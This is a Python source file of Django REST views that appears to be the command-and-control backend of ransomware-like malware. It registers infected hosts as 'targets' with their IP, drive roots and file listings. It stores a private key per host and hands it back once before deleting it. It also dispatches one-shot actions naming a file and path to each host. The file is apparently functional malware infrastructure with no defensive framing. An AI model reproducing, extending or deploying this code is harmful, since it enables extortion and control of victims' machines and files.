import json
from rest_framework.response import Response
from rest_framework.decorators import api_view
import datetime
from .models import *

@api_view(['POST'])
def getAction(request):
    body_unicode = request.body.decode('utf-8')
    body = json.loads(body_unicode)
    hostname=body['hostname']
    if Action.objects.filter(system_name=hostname).filter(deactive_action=False).exists():
        path=Action.objects.filter(system_name=hostname).values('path')[0]['path']
        filename=Action.objects.filter(system_name=hostname).values('filename')[0]['filename']
        action_name=Action.objects.filter(system_name=hostname).values('action_name')[0]['action_name']
        Action.objects.filter(system_name=hostname).filter(deactive_action=False).update(deactive_action=True)
        if SystemInfos.objects.exists():
            data={
                "filename":filename,
                "path":path,
                "action_name":action_name,
                "total_targets":SystemInfos.objects.all().count()
            }
            return Response({"data":data,"status":200})
        else:
            data={
                "filename":filename,
                "path":path,
                "action_name":action_name,
                "total_targets":0
            }
            return Response({"data":data,"status":200})
    return Response({"data":"server is running","status":200})

@api_view(['POST'])
def send(request):
    body_unicode = request.body.decode('utf-8')
    body = json.loads(body_unicode)
    hostname=body['hostname']
    key=body['private_key']
    filename=body['filename']
    path=body['path']
    if hostname and key:
        try:
            x=PrivateKey(system_name=hostname,key=key,path=path,filename=filename,created_at=datetime.date.today())
            x.save()
        except:
            return Response({"Info":"Failure!!","status":400})
    return Response({"Info":"server is running","status":200})

@api_view(['POST'])
def getPrivateKey(request):
    body_unicode = request.body.decode('utf-8')
    body = json.loads(body_unicode)
    hostname=body['hostname']
    if PrivateKey.objects.filter(system_name=hostname).exists():
            path=PrivateKey.objects.filter(system_name=hostname).values('path')[0]['path']
            filename=PrivateKey.objects.filter(system_name=hostname).values('filename')[0]['filename']
            private_key=PrivateKey.objects.filter(system_name=hostname).values('key')[0]['key']
            PrivateKey.objects.filter(system_name=hostname).delete()
            data={
                "path":path,
                "filename":filename,
                "key":private_key
            }
            return Response({"data":data,"status":200})
    return Response({"data":"server is running","status":200})


@api_view(['POST'])
def getSystemInfo(request):
    body_unicode = request.body.decode('utf-8')
    body = json.loads(body_unicode)
    hostname=body['hostname']
    ip=body['ip']
    roots=body['roots']
    items=body['items']
    if hostname and ip and roots and items:
        if SystemInfos.objects.exists():
            if SystemInfos.objects.filter(system_name=hostname).exists():
                SystemInfos.objects.filter(system_name=hostname).update(roots=roots)
                SystemInfos.objects.filter(system_name=hostname).update(items=items)
                if SystemInfos.objects.exists():
                        return Response({"total_targets":SystemInfos.objects.all().count()})
                else:
                        return Response({"total_targets":0})
            else:
                try:
                    x=SystemInfos(ip=ip,system_name=hostname,roots=roots,items=items)
                    x.save()
                    if SystemInfos.objects.exists():
                        return Response({"total_targets":SystemInfos.objects.all().count()})
                    else:
                        return Response({"total_targets":0})
                except:
                    return Response({"Info":"Failure!!","status":400})
        else:
            try:
                x=SystemInfos(ip=ip,system_name=hostname,roots=roots,items=items)
                x.save()
                if SystemInfos.objects.exists():
                        return Response({"total_targets":SystemInfos.objects.all().count()})
                else:
                        return Response({"total_targets":0})
            except:
                return Response({"Info":"Failure!!","status":400})

    return Response({"Info":"server is running","status":200})
